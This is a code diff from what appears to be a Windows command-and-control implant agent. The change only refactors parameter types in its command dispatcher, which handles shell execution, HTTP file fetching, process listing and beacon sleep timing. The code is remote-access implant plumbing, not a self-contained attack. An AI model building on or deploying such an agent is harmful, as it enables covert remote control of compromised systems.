@@ -8,7 +8,7 @@
 #include "whisper_json.h"
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
-
+#include "whisper_structs.h"
 // function command related items
 
 /*
@@ -22,13 +22,13 @@
 void set_response_data(OutboundJsonDataStruct *response_struct, const char *data);
 
 void get_username(OutboundJsonDataStruct *response_struct);
-int parse_command(char *command, char *args, OutboundJsonDataStruct *, CONFIG *config);
+int parse_command(char *command, char *args, OutboundJsonDataStruct *, HeapStore *heapStorePointer);
 void shell(OutboundJsonDataStruct *, char *args);
 void get_file_http(OutboundJsonDataStruct *, char *args);
 void messagebox(OutboundJsonDataStruct *, char *args);
-void sleep(OutboundJsonDataStruct *, char *args, CONFIG *config);
+void sleep(OutboundJsonDataStruct *, char *args, HeapStore *heapStorePointer);
 void help(OutboundJsonDataStruct *);
-void set_execution_mode_command(OutboundJsonDataStruct *response_struct, char *args, CONFIG *config);
+void set_execution_mode_command(OutboundJsonDataStruct *response_struct, char *args, HeapStore *heapStorePointer);
 
 // filesystem stuff
 void mkdir(OutboundJsonDataStruct *response_struct, char *args);
@@ -59,7 +59,7 @@ void list_processes(OutboundJsonDataStruct *response_struct);
 // later - have a seperate parse tree based on if creds are supplied or not, or
 // somethign like that...
 
-int parse_command(char *command, char *args, OutboundJsonDataStruct *response_struct, CONFIG *config)
+int parse_command(char *command, char *args, OutboundJsonDataStruct *response_struct, HeapStore *heapStorePointer)
 {
     if (!response_struct)
     {
@@ -98,7 +98,7 @@ int parse_command(char *command, char *args, OutboundJsonDataStruct *response_st
     else if (strcmp(command, "sleep") == 0)
     {
         DEBUG_LOG("[COMMAND] sleep\n");
-        sleep(response_struct, args, config);
+        sleep(response_struct, args, heapStorePointer);
     }
     else if (strcmp(command, "mkdir") == 0)
     {
@@ -183,7 +183,7 @@ int parse_command(char *command, char *args, OutboundJsonDataStruct *response_st
     else if (strcmp(command, "execution_mode") == 0)
     {
         DEBUG_LOG("[COMMAND] execution_mode\n");
-        set_execution_mode_command(response_struct, args, config);
+        set_execution_mode_command(response_struct, args, heapStorePointer);
     }
     else
     {
@@ -246,7 +246,7 @@ void set_response_data(OutboundJsonDataStruct *response_struct, const char *data
 // Commands
 // ====================
 
-void set_execution_mode_command(OutboundJsonDataStruct *response_struct, char *args, CONFIG *config)
+void set_execution_mode_command(OutboundJsonDataStruct *response_struct, char *args, HeapStore *heapStorePointer)
 {
     char *context = NULL;
     char *mode_arg = strtok_s(args, " ", &context);
@@ -259,12 +259,12 @@ void set_execution_mode_command(OutboundJsonDataStruct *response_struct, char *a
 
     if (strcmp(mode_arg, "async") == 0)
     {
-        set_execution_mode(EXEC_MODE_ASYNC, config);
+        set_execution_mode(EXEC_MODE_ASYNC, heapStorePointer);
         set_response_data(response_struct, "Execution mode set to asynchronous");
     }
     else if (strcmp(mode_arg, "sync") == 0)
     {
-        set_execution_mode(EXEC_MODE_SYNC, config);
+        set_execution_mode(EXEC_MODE_SYNC, heapStorePointer);
         set_response_data(response_struct, "Execution mode set to synchronous");
     }
     else
@@ -474,7 +474,7 @@ void get_file_http(OutboundJsonDataStruct *response_struct, char *args)
 }
 
 // Keep
-void sleep(OutboundJsonDataStruct *response_struct, char *args, CONFIG *config)
+void sleep(OutboundJsonDataStruct *response_struct, char *args, HeapStore *heapStorePointer)
 {
     /*
         Sets the sleep time for the agent.
@@ -513,7 +513,7 @@ void sleep(OutboundJsonDataStruct *response_struct, char *args, CONFIG *config)
     }
     dwTime = (DWORD)(sleep_seconds);
 
-    set_sleep_time(dwTime, config);
+    set_sleep_time(dwTime, heapStorePointer);
     char message[256];
     snprintf(message, sizeof(message), "Sleep time set to %ld seconds", sleep_seconds); // response message
     set_response_data(response_struct, message);
